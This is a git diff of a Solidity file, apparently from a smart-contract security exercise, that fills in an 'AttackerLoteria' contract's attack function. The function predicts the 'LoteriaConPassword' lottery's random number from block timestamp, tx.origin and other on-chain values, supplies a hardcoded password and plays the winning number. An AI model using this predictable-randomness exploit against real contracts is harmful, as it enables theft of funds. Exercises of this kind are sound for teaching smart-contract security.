@@ -67,5 +67,35 @@ contract LoteriaConPassword {
 }
 
 contract AttackerLoteria {
-    function attack(address _sc) public payable {}
+
+    uint256 public FACTOR =
+        104312904618913870938864605146322161834075447075422067288548444976592725436353;
+    function attack(address _sc) public payable {
+        LoteriaConPassword loteria = LoteriaConPassword(_sc);
+
+        
+      
+        uint256 numRandom = uint256(
+            keccak256(
+                abi.encodePacked(
+                    FACTOR,
+                    msg.value,
+                    tx.origin,
+                    block.timestamp,
+                    address(this)
+                )
+            )
+        );
+        
+
+        uint8 password = 202; 
+        
+        uint256 numeroGanador = numRandom % 10;
+      
+        loteria.participarEnLoteria{value: 1500 wei}(uint8(password), numeroGanador);
+        
+        
+    }
+
+    receive() external payable {}
 }
